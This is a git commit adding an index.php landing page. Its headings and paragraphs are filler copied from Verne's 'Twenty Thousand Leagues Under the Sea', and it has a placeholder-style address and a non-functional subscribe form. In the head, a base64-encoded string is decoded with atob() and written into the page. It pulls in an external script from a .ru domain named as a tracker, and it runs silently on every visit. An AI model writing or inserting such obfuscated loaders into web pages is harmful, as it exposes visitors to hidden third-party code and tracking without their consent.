c11a2900e3dec75f7578ac0db4ac61ff4e97a0ab
cjezhjue <77057774+cjezhjue@users.noreply.github.com>
2021-01-06 14:48:27 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>At that moment I was leaning forward on the starboard netting. Cons</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl93ZDZ2ZG5sNXB3Y2oiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>At that moment I was leaning forward on the starboard netting. Cons</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">We were close to Vanikoro, really the one to which </h3>
+		<p>At St. Malo, answered Conseil. Then a sudden thought terrified me. Captain Nemo had left his room. He was in the saloon, which I must cross to fly. There I should meet him for the last time. He would see me, perhaps speak to me. A gesture of his might destroy me, a single word chain me on board. I had placed myself at the port scuttle, and saw some magnificent substructures of coral, zoophytes, seaweed, and fucus, agitating their enormous claws, which stretched out from the fissures of the rock. Yes, sir, replied the engineer.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Captain Nemo then led me aft; and in passi</h3>
+		<p>I looked at the last rays crowning the peak, and the shadows mounting by degrees up its slopes. At that moment Captain Nemo, resting with his hand on my shoulder, said: M. Aronnax, we must attempt some desperate means, or we shall be sealed up in this solidified water as in cement. Certainly, I was sure of this devoted boy. As a rule, I never asked him if it were convenient for him or not to follow me in my travels; but this time the expedition in question might be prolonged, and the enterprise might be hazardous in pursuit of an animal capable of sinking a frigate as easily as a nutshell. Here there was matter for reflection even to the most impassive man in the world. What would Conseil say? See! exclaimed the harpooner. But we can see nothing in this iron prison! We are walking-we are sailing-blindly.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">Mussels too? asked the Canadian.</h3>	
+		<p>We must ask Captain Nemo, said Conseil. We are accustomed to them, replied Captain Nemo, and in time you will be too. However, we shall be armed, and on the road we may be able to hunt some of the tribe. It is interesting. So, till to-morrow, sir, and early. The boat put off, and lifted by the six rowers, drew rapidly toward the dugong, which floated about two miles from the Nautilus. The Scotia had not struck, but she had been struck, and seemingly by something rather sharp and penetrating than blunt. The shock had been so light that no one had been alarmed, had it not been for the shouts of the carpenter's watch, who rushed on to the bridge, exclaiming, We are sinking! We are sinking! At first the passengers were much frightened, but Captain Anderson hastened to reassure them. The danger could not be imminent. The Scotia, divided into seven compartments by strong partitions, could brave with impunity any leak. Captain Anderson went down immediately into the hold. He found that the sea was pouring into the fifth compartment; and the rapidity of the influx proved that the force of the water was considerable. Fortunately this compartment did not hold the boilers, or the fires would have been immediately extinguished. Captain Anderson ordered the engines to be stopped at once, and one of the men went down to ascertain the extent of the injury. Some minutes afterward they discovered the existence of a large hole, of two yards in diameter, in the ship's bottom. Such a leak could not be stopped; and the Scotia, her paddles half submerged, was obliged to continue her course. She was then three hundred miles from Cape Clear, and after three days' delay, which caused great uneasiness in Liverpool, she entered the basin of the company.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>82991 Josiane Pines, Suite 980, 41533, Walterchester, Illinois, United States</p>
+	</footer>
+
+</body>
+
+</html>
